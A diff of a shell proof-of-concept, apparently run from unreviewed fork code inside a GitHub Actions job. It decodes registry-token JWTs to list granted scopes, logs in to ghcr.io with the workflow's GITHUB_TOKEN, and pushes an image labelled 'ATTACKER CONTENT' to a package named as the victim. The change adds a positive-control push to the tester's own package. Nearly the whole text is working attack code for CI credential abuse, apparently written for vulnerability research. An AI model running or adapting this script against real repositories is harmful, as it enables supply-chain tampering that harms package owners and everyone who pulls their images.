@@ -18,12 +18,14 @@ scope_probe () {  # $1=label $2=scope-string $3=authmode(tok|anon)
   fi
   code="$out"; body=$(cat /tmp/b)
   if [ "$code" = "200" ]; then
-    # decode the JWT payload's access claim; base64url, pad it
-    local p; p=$(echo "$body" | jq -r '.token' | cut -d. -f2)
-    p="${p//-/+}"; p="${p//_//}"
-    while [ $(( ${#p} % 4 )) -ne 0 ]; do p="${p}="; done
-    acc=$(echo "$p" | base64 -d 2>/dev/null | jq -c '.access' 2>/dev/null)
-    echo "PKGX|SCOPE|${label}|${mode}|http=${code}|granted=${acc}"
+    acc=$(echo "$body" | python3 -c '
+import sys,json,base64
+t=json.load(sys.stdin)["token"]; p=t.split(".")[1]
+p+="="*(-len(p)%4)
+d=json.loads(base64.urlsafe_b64decode(p))
+print("access=%s | keys=%s" % (json.dumps(d.get("access")), sorted(d.keys())))
+' 2>&1 | head -c 400)
+    echo "PKGX|SCOPE|${label}|${mode}|http=${code}|${acc}"
   else
     echo "PKGX|SCOPE|${label}|${mode}|http=${code}|body=$(echo "$body" | head -c 200 | tr -d '\n')"
   fi
@@ -55,6 +57,13 @@ echo "${GITHUB_TOKEN}" | docker login ghcr.io -u x --password-stdin && echo "PKG
 mkdir -p /tmp/img && cd /tmp/img
 printf 'FROM scratch\nCOPY f /f\n' > Dockerfile
 echo "ATTACKER CONTENT pushed from ${GITHUB_EVENT_NAME} run ${GITHUB_RUN_ID} by unreviewed fork code" > f
+OWNT="ghcr.io/kovac-labs/zz-mq-tok-1027:ownctl-${GITHUB_RUN_ID}"
+docker build -q -t "$OWNT" . >/dev/null && echo "PKGX|BUILD-OWN|OK"
+if docker push "$OWNT" > /tmp/pown.log 2>&1; then
+  echo "PKGX|OWN-PUSH-POSITIVE-CONTROL|SUCCEEDED|tag=ownctl-${GITHUB_RUN_ID}"
+else
+  echo "PKGX|OWN-PUSH-POSITIVE-CONTROL|REFUSED|$(tail -3 /tmp/pown.log | tr -d '\n' | head -c 300)"
+fi
 T="ghcr.io/kovac-labs/zz-victim-pkg-1027:attacker-${GITHUB_RUN_ID}"
 docker build -q -t "$T" . && echo "PKGX|BUILD|OK"
 if docker push "$T" > /tmp/push.log 2>&1; then
